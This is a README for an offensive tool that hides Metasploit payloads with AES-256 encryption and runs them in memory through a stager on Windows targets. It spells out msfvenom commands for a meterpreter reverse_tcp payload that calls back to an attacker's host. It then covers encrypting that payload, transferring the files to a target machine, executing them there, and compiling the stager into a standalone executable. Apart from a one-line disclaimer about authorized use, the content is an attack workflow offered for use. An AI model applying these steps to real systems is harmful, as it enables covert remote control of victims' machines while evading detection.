

---

# AES-256 Payload Obfuscation Tool

This tool is designed to obfuscate Metasploit payloads using AES-256 encryption. It includes a Python script to encrypt the payload and a stager script to decrypt and execute the payload in memory.

## Features
- Encrypts raw payloads using AES-256-CBC.
- Generates a stager script to decrypt and execute the payload in memory.
- Supports custom encryption keys.
- Works with Windows payloads (x86/x64).

## Prerequisites
- Python 3.x
- `pycryptodome` library (for AES encryption/decryption)
- Metasploit Framework (for generating payloads)



## Usage

### Step 1: Generate a Payload with Metasploit
Use `msfvenom` to generate a raw payload. For example:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw -o payload.bin
```

### Step 2: Encrypt the Payload
Use the `encrypt_payload.py` script to encrypt the payload:
```bash
python encrypt_payload.py -i payload.bin -o encrypted.bin
```
- `-i`: Input payload file (e.g., `payload.bin`).
- `-o`: Output encrypted file (e.g., `encrypted.bin`).
- `-k`: (Optional) Specify a 32-byte encryption key in hex format. If not provided, a random key will be generated.

Example with a custom key:
```bash
python encrypt_payload.py -i payload.bin -o encrypted.bin -k 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
```

### Step 3: Use the Stager
The `encrypt_payload.py` script generates a `stager.py` file. This script decrypts and executes the payload in memory.

1. Transfer the following files to the target machine:
   - `encrypted.bin` (encrypted payload)
   - `stager.py` (loader script)

2. Run the stager on the target machine:
   ```bash
   python stager.py
   ```

### Optional: Compile the Stager
To make the stager more portable, you can compile it into an executable using `PyInstaller`:
```bash
pip install pyinstaller
pyinstaller --onefile stager.py
```
The compiled executable will be located in the `dist` folder.

## Example Workflow
1. Generate a payload:
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o payload.bin
   ```

2. Encrypt the payload:
   ```bash
   python encrypt_payload.py -i payload.bin -o encrypted.bin
   ```

3. Transfer `encrypted.bin` and `stager.py` to the target machine.

4. Execute the stager:
   ```bash
   python stager.py
   ```

## Notes
- The stager uses Windows API calls and is only compatible with Windows systems.
- Ensure the payload architecture (x86/x64) matches the target system.
- Use this tool only in authorized environments for legitimate purposes.


